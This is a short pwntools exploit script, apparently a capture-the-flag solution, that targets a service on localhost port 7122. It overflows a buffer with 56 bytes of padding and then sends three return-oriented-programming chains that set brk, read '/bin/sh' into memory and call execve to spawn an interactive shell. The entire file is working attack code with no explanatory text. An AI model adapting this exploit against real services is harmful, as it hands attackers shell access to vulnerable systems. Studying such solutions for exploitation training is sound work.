#!/usr/bin/env python2

from pwn import *

context.arch = 'amd64'
r = remote('127.0.0.1', 7122)

_start = 0x400080
pop_rax_ret = 0x400114
pop_rdx_ret = 0x4000ab
pop_rdi_rsi_rdx = 0x4000a9
syscall_ret = 0x4000bf
buff = 0x10000000-0x1000

'''
rop = [
	pop_rdx_ret,
	0,
	pop_rax_ret,
	322,
	syscall_ret
]
'''

rop = [
	# set brk
	pop_rax_ret,
	12,
	pop_rdi_rsi_rdx,
	0x10000000,
	0,
	0,
	syscall_ret,
	_start
]

rop2 = [
	# read /bin/sh
	pop_rdi_rsi_rdx,
	0,
	buff,
	0x10,
	pop_rax_ret,
	0,
	syscall_ret,
	_start
]

rop3 = [
	pop_rdi_rsi_rdx,
	buff,
	0,
	0,
	pop_rax_ret,
	59,
	syscall_ret
]

r.send('A'.ljust(56)+flat(rop))
r.send('A'.ljust(56)+flat(rop2))
sleep(0.2)
r.send('/bin/sh\x00')
#raw_input('@')
r.send('A'.ljust(56)+flat(rop3))

r.interactive()

